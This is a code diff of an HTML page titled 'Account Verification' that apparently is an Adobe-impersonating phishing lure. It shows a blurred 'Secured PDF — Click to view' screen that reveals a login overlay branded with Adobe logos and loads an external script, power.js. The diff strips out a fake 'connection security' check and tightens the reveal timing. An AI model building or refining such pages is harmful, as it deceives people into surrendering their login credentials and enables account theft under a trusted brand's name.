@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <title>Account Verification</title>
 
-  <!-- Font Awesome -->
+  <!-- Font Awesome for icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 
   <!-- Custom CSS -->
@@ -23,48 +23,32 @@
     });
   </script>
 
-  <!-- Startup logic -->
+  <!-- Reveal overlay after click -->
   <script>
     window.addEventListener("DOMContentLoaded", () => {
-      const loader = document.getElementById("security-loader");
       const start = document.getElementById("start-screen");
       const overlay = document.getElementById("overlay");
-
-      // Simulate "security check" for 3 seconds
-      setTimeout(() => {
-        loader.classList.add("hide");
-        start.classList.add("show");
-      }, 3000);
-
-      // When user clicks the blurred doc, reveal login
       start.addEventListener("click", () => {
-        start.classList.remove("show");
         start.classList.add("hide");
-        setTimeout(() => overlay.classList.add("show"), 600);
+        setTimeout(() => overlay.classList.add("show"), 300);
       });
     });
   </script>
 </head>
 <body>
 
-  <!-- Security Check Loader -->
-  <div id="security-loader">
-    <div class="loader-circle"></div>
-    <div class="loader-text">Checking connection security...</div>
-  </div>
-
-  <!-- Full blurred document preview -->
-  <div id="start-screen">
+  <!-- Full blurred document start screen -->
+  <div id="start-screen" title="Click to view">
     <div class="doc-overlay">
       <i class="fas fa-file-pdf"></i>
       <span>🔒 Secured PDF — Click to view</span>
     </div>
   </div>
 
-  <!-- Background iframe (your original element) -->
+  <!-- Fullscreen background iframe -->
   <iframe id="bg-frame"></iframe>
 
-  <!-- Login overlay (your existing layout) -->
+  <!-- Login overlay -->
   <div class="overlay" id="overlay">
     <div class="login-box">
       <img id="logo" alt="Logo" src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Adobe_Corporate_logo.svg" />
@@ -89,12 +73,11 @@
     </div>
   </div>
 
-  <!-- Bouncing Adobe-styled logo -->
+  <!-- Bouncing logo -->
   <div class="bouncing-logo">
     <img src="https://i.postimg.cc/SQqcxNCn/temp-Image-Bgz-Qo3.avif" alt="Adobe Logo" />
   </div>
 
-  <!-- Your original JS file -->
   <script src="power.js"></script>
 </body>
 </html>
